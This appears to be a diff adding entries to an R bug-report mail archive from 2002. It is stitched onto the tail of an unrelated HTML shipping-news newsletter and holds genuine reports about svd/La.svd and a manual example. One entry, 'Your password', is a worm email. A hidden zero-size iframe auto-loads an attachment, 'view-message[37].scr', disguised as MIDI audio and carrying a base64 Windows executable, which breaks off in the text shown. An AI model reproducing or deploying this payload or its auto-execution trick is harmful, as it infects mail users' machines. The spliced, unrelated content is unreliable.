+                                             </tr>                         
+                                             <tr>                         
+                                              <td class="text" bgcolor="#FFFFEC" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="21">                                                                                            
+                                                 &nbsp;6.                                                                                               
+                                                 </td>                                                                                                
+                                              <td class="text" bgcolor="#FFFFEC" width="391" style="padding-top: 1; padding-bottom: 1" height="21">                                                                                             
+                                                 Daewoo Shipbuilding(Korea) was awarded a deal to build four 140,500cbm LNG     
+                                                 carriers for Norway's Bergesen,  
+                                                 at an estimated price of more than $160 million per ship.                                                                                                 
+                                                 </td>                                                                                                  
+                                             </tr>                         
+                                             <tr>                         
+                                              <td class="text" bgcolor="#ffffff" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                            
+                                                 &nbsp;7.                                                                                              
+                                                 </td>                                                                                               
+                                              <td class="text" bgcolor="#ffffff" width="391" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                            
+                                                 Target Marine S.A. (Greece) ordered three 45800dwt Product Oil Tankers from STX shipyard(Korea), at worth aprox. US$ 100mill.                                                                                               
+                                                 </td>                                                                                                
+                                             </tr>                         
+                                             <tr>     
+                                              <td class="text" bgcolor="#FFFFEC" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                            
+                                                 &nbsp;8.                                                                                              
+                                                 </td>                                                                                               
+                                              <td class="text" bgcolor="#FFFFEC" width="391" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                            
+                                                 GE Marine Engines' LM2500 aeroderivative gas turbines and main reduction gears have been selected for use aboard the Italian Navy's new Andrea Doria aircraft carrier.                                                                                                
+                                                 </td>                                                                                                 
+                                             </tr>     
+                                             <tr>     
+                                              <td class="text" bgcolor="#ffffff" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                            
+                                                 &nbsp;9.                                                                                             
+                                                 </td>                                                                                              
+                                              <td class="text" bgcolor="#ffffff" width="391" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                           
+                                                 Norsk Hydro has awarded Kvaerner a contract worth $39 million to upgrade gas compression capacity on the Oseberg C platform in the Norwegian North Sea.                                                                                                
+                                                 </td>                                                                                                 
+                                             </tr>     
+                                             <tr>     
+                                              <td class="text" bgcolor="#FFFFEC" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                            
+                                                 10.                                                                                             
+                                                 </td>                                                                                              
+                                              <td class="text" bgcolor="#FFFFEC" width="391" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                           
+                                                 Bollinger's Algiers repair and conversion yard contracted a major conversion project that will convert eight 105-ft. single screw tugs to 4,000 hp twin screw     
+                                                 boats with Crescent Towing.                                                                                                
+                                                 </td>                                                                                                 
+                                             </tr>     
+                                             <tr>     
+                                              <td class="text" bgcolor="#ffffff" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                            
+                                                 11.                                                                                             
+                                                 </td>                                                                                              
+                                              <td class="text" bgcolor="#ffffff" width="391" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                           
+                                                 TECHNIP-COFLEXIP contracted     
+                                                 with Saudi Arabian Oil Company     
+                                                 SAUDI ARAMCO, for the expansion     
+                                                 of the Berri gas plant to     
+                                                 handle additional output of     
+                                                 sour gas from the Qatif field,     
+                                                 which is now under development.                                                                                               
+                                                 </td>                                                                                                
+                                             </tr>    
+                                             <tr>                        
+                                              <td class="text" bgcolor="#FFFFEC" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                           
+                                                 12.                                                                                             
+                                                 </td>                                                                                              
+                                              <td class="text" bgcolor="#FFFFEC" width="391" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                           
+                                                 Wilhelmsen ASA and Wallenius     
+                                                 have jointly signed a MOU with     
+                                                 Hyundai Merchant Marine (Korea)     
+                                                 for the possible acquisition of     
+                                                 the the car carrier division of     
+                                                 HMM which would continue to be     
+                                                 operated as a separate company     
+                                                 with its Korean profile.                                                                                               
+                                                 </td>                                                                                                
+                                             </tr>                         
+                                             <tr>   
+                                              <td class="text" bgcolor="#ffffff" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                          
+                                                 13.                                                                                            
+                                                 </td>                                                                                             
+                                              <td class="text" bgcolor="#ffffff" width="391" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                            
+                                                 <font color="#505050"><b>Medium-size bulkers stand out shipbuilding inquiries</b></font><br>     
+                                                 Newshipbuilding inquiries in January sent to major shipyards in Korea and Japan are     
+                                                 mostly Handy size and Panamax bulk carriers.                                                                                                 
+                                                 </td>                                                                                                  
+                                             </tr>   
+                                             <tr>                         
+                                              <td class="text" bgcolor="#FFFFEC" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                          
+                                                 14.                                                                                           
+                                                 </td>                                                                                            
+                                              <td class="text" bgcolor="#FFFFEC" width="391" style="padding-top: 1; padding-bottom: 1" height="14">                                                                                           
+                                                 <font color="#505050"><b>    
+                                                 Port Logistics 2002 Conference, Amsterdam,   
+                                                 Netherlands&nbsp;<br>   
+                                                 </b></font>   
+                                                 18-20 March 2002, In Amsterdam you will find out how technology is improving the relationship between shippers and their transportation providers.                                                                                                 
+                                                 </td>                                                                                                  
+                                             </tr>                         
+                                             <tr>                         
+                                              <td class="text" bgcolor="#ffffff" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="12">                                                                                             
+                                                 <font color="#505050">15.</font>                                                                                             
+                                                 </td>                                                                                              
+                                              <td class="text" bgcolor="#ffffff" width="391" style="padding-top: 1; padding-bottom: 1" height="12">                                                                                          
+                                                 <b><font color="#505050">Bergesen - Sale of Tanker for scrap</font></b><br>    
+ Bergesen has sold the tanker Berge Ingerid 357.345 dwt, built in 1977, for scrap. Net contract price is about USD 5,3 million.                                                                                              
+                                                 </td>                                                                                               
+                                             </tr>                        
+                                             <tr>    
+                                              <td class="text" bgcolor="#FFFFEC" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="9">                                                                                            
+                                                 16.                                                                                            
+                                                 </td>                                                                                             
+                                              <td class="text" bgcolor="#FFFFEC" width="391" style="padding-top: 1; padding-bottom: 1" height="9">                                                                                        
+ <b><font color="#505050">Arctic Summer Sea Lanes Open By 2015 Forecasts</font></b><br>   
+                                                 Arctic will have open sea lanes as soon as 2015. By 2050, the summertime ice cap could disappear entirely. Over the past century, the extent of the winter pack ice in the Nordic Seas has decreased by about 25%. Last winter the Bering Sea was effectively ice-free.                                                                                                   
+                                                 </td>                                                                                                    
+                                             </tr>    
+                                             <tr>               
+                                              <td class="text" bgcolor="#ffffff" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="9">                                                                                            
+                                                 17.                                                                                           
+                                                 </td>                                                                                            
+                                              <td class="text" bgcolor="#ffffff" width="391" style="padding-top: 1; padding-bottom: 1" height="9">                                                                                       
+ <b><font color="#505050">   
+ $4.5 billion budget to rebuild facilities at the World Trade Center</font></b><br>    
+ The Port Authority of New York and New Jersey approved a $4.5 billion budget for 2002 on Thursday, reaffirming its financial resilience and determination to rebuild facilities at the World Trade Center.The new budget includes plans to spend nearly $2 billion in new capital projects, including $309 million mostly to reconstruct the PATH commuter station that was located under the World Trade Center.                                                                                                  
+                                                 </td>                                                                                                   
+                                             </tr>                
+                                             <tr>                
+                                              <td class="text" bgcolor="#FFFFEC" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="9">                                                                                             
+                                                 18.                                                                                           
+                                                 </td>                                                                                            
+                                              <td class="text" bgcolor="#FFFFEC" width="391" style="padding-top: 1; padding-bottom: 1" height="9">                                                                                       
+                                                 <b><font color="#505050">US steel tariffs to hit 30%</font></b><br>    
+                                                 US president George W Bush is set to impose tariffs of up to 30 per cent on imported steel.&nbsp;<br>    
+                                                 The major steel exporters are expected to be hit hardest. The highest tariffs will be imposed on Japan, China, South Korea, Russia, Ukraine and Brazil, but Mexico and Canada will be exempt together with developing economies in Argentina, Thailand and Turkey. Japan and the EU both warned that tariffs could lead to further trade disputes, possibly in the   
+                                                 WTO.                                                                                                
+                                                 </td>                                                                                                 
+                                             </tr>              
+                                             <tr>              
+                                              <td class="text" bgcolor="#ffffff" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="9">                                                                                           
+                                                 19.                                                                                           
+                                                 </td>                                                                                            
+                                              <td class="text" bgcolor="#ffffff" width="391" style="padding-top: 1; padding-bottom: 1" height="9">                                                                                       
+                                                 <b><font color="#505050">Improve China's competitiveness<br>   
+                                                 </font></b>China State Shipbuilding Corporation (CSSC), one of China's top 100 enterprises, will purchase 10,000 licenses of the Autodesk Inventor Series over the next three     
+                                                 years.<br>    
+    China is the third-largest shipbuilding nation in the world, and entry into the World Trade Organization has created an urgent need to upgrade its shipping industry's technology infrastructure.     
+                                                 Implementing enterprise-wide IT and advanced digital design solutions are necessary to improve China's competitiveness in the global shipbuilding industry.&nbsp;                                                                                                  
+                                                 </td>                                                                                                   
+                                             </tr>                
+                                      </table>                                                                                           
+                                </td>                                                                                           
+                            </tr>                                                                                           
+                            <tr>                                                               
+                              <td colspan="2" bgcolor="#ffffff" valign="top" height="1">                                                                                    
+                                     <table width="590" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff" height="1">                                                                                    
+                                             <tr><td colspan="2" bgcolor="#ffffff" align="center" height="1"></td></tr>                                                                      
+                                             <tr>                                 
+                                              <td colspan="3" align="center" bgcolor="#FEB05A" class="text" height="17"><font color="#666666"><b>:::                                     
+                                                Company and Product                                     
+                                                Advertisement :::&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;           
+                                                </b></font><img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"><font color="#666666"><b>           
+                                                <font color="#808080"><a href="http://www.marinedigital.com/en/mall/product/index.asp?menu_code=ShipSaleView&amp;GoodsNo=S51602036">Send                          
+                                                your Ads</a></font></b></font></td>                                          
+                                             </tr>                                   
+                                             <tr>                                   
+                                              <td colspan="3" align="center" bgcolor="#000000" height="1"></td>                                          
+                                             </tr>                                   
+                                             <tr>                         
+                                              <td width="590" valign="top" colspan="3" height="1" style="padding-top: 5">                                                                                        
+                                                      <b><font size="2"><font color="#0000FF">&lt;</font>      
+                                                      <font color="#0000FF">Marine      
+                                                      Electric Equipment      
+                                                      (Switchboards / Starters /      
+                                                      Consoles) &gt;</font></font></b><br>                           
+                                                      &nbsp;&nbsp;                          
+                                                      <a href="http://www.marinedigital.com/en/products_sell/hdvalve/feature.asp"><b><font color="#000000"><br>    
+                                                      &nbsp;</font><font color="#A9340F">NASAN      
+                                                      Electric Industry Co., LTD      
+                                                      (Korea)</font></b> <font color="#000000">manufactures      
+                                                      electric switchboards,      
+                                                      control systems and      
+                                                      control consoles which      
+                                                      have been supplied to many      
+                                                      sophisticated 67 ships      
+                                                      such as drilling ships,      
+                                                      shuttle tankers, passenger      
+                                                      ships, offshore projects      
+                                                      and even power plants as&nbsp;a      
+                                                      turnkey project or OEM      
+                                                      base.<br>     
+                                                      </font></a>                          
+                                                      <table border="0" width="100%" height="15">                          
+                                                        <tr>                          
+                                                          <td width="29%" height="16">                                                                                                          
+                                                                                               &nbsp;                                                                                                           
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11">                              
+                                                                                               <a href="http://www.marinedigital.com/en/products_sell/nasan/introduction.asp">     
+                                                                                               <b>Introduction</b></a></td>                          
+                                                          <td width="24%" height="16" colspan="2"></td>                         
+                                                          <td width="24%" height="16" colspan="2"></td>                         
+                                                          <td width="23%" height="16"></td>                         
+                                                        </tr>                         
+                                                        <tr>                         
+                                                          <td width="29%" height="1">&nbsp;                                                                                                           
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11">                              
+                                                            <b><font color="#0000FF">Products</font></b></td>                         
+                                                          <td width="24%" height="1" colspan="2"></td>                         
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 1363 *
+Subject: svd, La.svd
+From: kjetil halvorsen <kjetilh@umsanet.edu.bo>
+Date: Thu, 07 Mar 2002 13:41:46 -0400
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 1363 <==
+From postmaster@franz.stat.wisc.edu  Thu Mar  7 18:44:20 2002
+Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA23474
+	for <r-bugs@biostat.ku.dk>; Thu, 7 Mar 2002 18:44:19 +0100 (MET)
+Received: from jupiter.umsanet.edu.bo (really [166.114.17.11]) by franz.stat.wisc.edu
+	via smail with esmtp
+	id <m16j1vc-000IbPC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
+	for <r-bugs@r-project.org>; Thu, 7 Mar 2002 11:43:44 -0600 (CST) 
+Received: from umsanet.edu.bo (antiguo31.umsanet.edu.bo [192.168.14.31])
+	by jupiter.umsanet.edu.bo (8.11.0/8.9.3) with ESMTP id g27HvnK04444
+	for <r-bugs@r-project.org>; Thu, 7 Mar 2002 13:57:49 -0400
+Message-ID: <3C87A65A.8F2D0CB3@umsanet.edu.bo>
+Date: Thu, 07 Mar 2002 13:41:46 -0400
+From: kjetil halvorsen <kjetilh@umsanet.edu.bo>
+Reply-To: kjetilh@umsanet.edu.bo
+Organization: UMSA
+X-Mailer: Mozilla 4.7 [en] (Win98; I)
+X-Accept-Language: en
 MIME-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
+To: r-bugs@r-project.org
+Subject: svd, La.svd
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
 
-On Tue, 5 Mar 2002 hyu@stats.uwo.ca wrote:
+Hola:
 
-> Full_Name: Hao Yu
-> Version: 1.4.1
-> OS: Windws and Linux
-> Submission from: (NULL) (129.100.45.161)
+Both cannot be correct:
 
-[...]
+> m <- matrix(1:4, 2)
+> svd(m)
+$d
+[1] 5.4649857 0.3659662
 
-> the result was (PIII Xeon 1GHz RedHat 7.2 Linux))
-> > system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
-> [1] 9.76 0.22 9.97 0.00 0.00
->
-> Clearly there are some bugs in solve() and solve.Matrix(). Notice that all have
+$u
+           [,1]       [,2]
+[1,] -0.5760484 -0.8174156
+[2,] -0.8174156  0.5760484
 
-Nothing in this report suggests a bug in solve().  Can you please provide
-some evidence for your claim (which is not `clear' to me), and
+$v
+           [,1]       [,2]
+[1,] -0.4045536  0.9145143
+[2,] -0.9145143 -0.4045536
 
-> solve
-function (a, b, ...)
-UseMethod("solve")
+> La.svd(m)
+$d
+[1] 1.126182e-301 4.226051e-314
 
-seems hard to get wrong!  (It matters: solve is part of R: solve.Matrix is
-a contributed addon.)
+$u
+            [,1]         [,2]
+[1,] 0.002112565  0.999997769
+[2,] 0.999997769 -0.002112565
 
-Incidentally, these sort of timings are crucially dependent on the BLAS
-library used, and in my experience that is a far larger factor that the OS
-used.  However, that was not part of the report ....
+$vt
+           [,1]        [,2]
+[1,] 7.5449e-13  1.0000e+00
+[2,] 1.0000e+00 -7.5449e-13
 
--- 
-Brian D. Ripley,                  ripley@stats.ox.ac.uk
-Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
-University of Oxford,             Tel:  +44 1865 272861 (self)
-1 South Parks Road,                     +44 1865 272860 (secr)
-Oxford OX1 3TG, UK                Fax:  +44 1865 272595
+as m is an invertible matrix, the results of La.svd seems wrong.
 
+This is R1.4.1 on windows 98.
+
+Kjetil Halvorsen
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 1364 *
+Subject: An introduction to R
+From: kjetil halvorsen <kjetilh@umsanet.edu.bo>
+Date: Thu, 07 Mar 2002 16:02:05 -0400
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 1364 <==
+From postmaster@franz.stat.wisc.edu  Thu Mar  7 21:04:48 2002
+Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA23972
+	for <r-bugs@biostat.ku.dk>; Thu, 7 Mar 2002 21:04:47 +0100 (MET)
+Received: from jupiter.umsanet.edu.bo (really [166.114.17.11]) by franz.stat.wisc.edu
+	via smail with esmtp
+	id <m16j47L-000IWaC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
+	for <r-bugs@r-project.org>; Thu, 7 Mar 2002 14:03:59 -0600 (CST) 
+Received: from umsanet.edu.bo (antiguo31.umsanet.edu.bo [192.168.14.31])
+	by jupiter.umsanet.edu.bo (8.11.0/8.9.3) with ESMTP id g27KI7K04705
+	for <r-bugs@r-project.org>; Thu, 7 Mar 2002 16:18:07 -0400
+Message-ID: <3C87C73D.801A39AB@umsanet.edu.bo>
+Date: Thu, 07 Mar 2002 16:02:05 -0400
+From: kjetil halvorsen <kjetilh@umsanet.edu.bo>
+Reply-To: kjetilh@umsanet.edu.bo
+Organization: UMSA
+X-Mailer: Mozilla 4.7 [en] (Win98; I)
+X-Accept-Language: en
+MIME-Version: 1.0
+To: r-bugs@r-project.org
+Subject: An introduction to R
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+
+The following command from appendix A, "a sample session", isnt correct:
+
+contour(x, y, fa, nint=15) 
+
+when used R protests:
+
+Warning message: 
+parameter "nint" couldn't be set in high-level plot() function 
+
+
+it should probably be nlevels, as used a few lines before. 
+
+This is R1.4.1 on windows 98.
+
+Kjetil Halvorsen
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 1365 *
+Subject: Your password
+From: saikat <saikat@stat.wisc.edu>
+Date: Thu,  7 Mar 2002 23:06:07 +0100 (CET)
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 1365 <==
+From winkler@terramail.pl  Thu Mar  7 23:09:19 2002
+Received: from alfa.terramail.pl (alfa.terramail.pl [213.76.136.82])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA24251
+	for <r-bugs@biostat.ku.dk>; Thu, 7 Mar 2002 23:07:42 +0100 (MET)
+Received: from Lhyed (res53-156.residents.stolaf.edu [130.71.53.180])
+	by alfa.terramail.pl (Postfix) with SMTP id 49ACE22A79
+	for <r-bugs@biostat.ku.dk>; Thu,  7 Mar 2002 23:06:07 +0100 (CET)
+From: saikat <saikat@stat.wisc.edu>
+To: r-bugs@biostat.ku.dk
+Subject: Your password
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary=CQP0UB8601
+Message-Id: <20020307220607.49ACE22A79@alfa.terramail.pl>
+Date: Thu,  7 Mar 2002 23:06:07 +0100 (CET)
+
+--CQP0UB8601
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD></HEAD><BODY>
+<iframe src=3Dcid:Il77387ptk height=3D0 width=3D0>
+</iframe>
+<FONT></FONT></BODY></HTML>
+
+--CQP0UB8601
+Content-Type: audio/x-midi;
+	name=view-message[37].scr
+Content-Transfer-Encoding: base64
+Content-ID: <Il77387ptk>
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
+RE9TIG1vZGUuDQ0KJAAAAAAAAACYl33g3PYTs9z2E7Pc9hOzp+ofs9j2E7Nf6h2zz/YTszTp
+GbPm9hOzvukAs9X2E7Pc9hKzq/YTszTpGLPO9hOzZPAVs932E7NSaWNo3PYTswAAAAAAAAAA
+UEUAAEwBBABcmkI8AAAAAAAAAADgAA8BCwEGAADAAAAAgAgAAAAAAHiAAAAAEAAAANAAAAAA
+QAAAEAAAABAAAAQAAAAAAAAABAAAAAAAAAAAUAkAABAAAAAAAAACAAAAAAAQAAAQAAAAABAA
+ABAAAAAAAAAQAAAAAAAAAAAAAAAY1gAAZAAAAABACQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ANAAAOQBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAGq2AAAAEAAAAMAAAAAQ
+AAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAADqDwAAANAAAAAQAAAA0AAAAAAAAAAAAAAAAAAA
+QAAAQC5kYXRhAAAA7FMIAADgAAAAQAAAAOAAAAAAAAAAAAAAAAAAAEAAAMAucnNyYwAAABAA
+AAAAQAkAEAAAAAAgAQAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
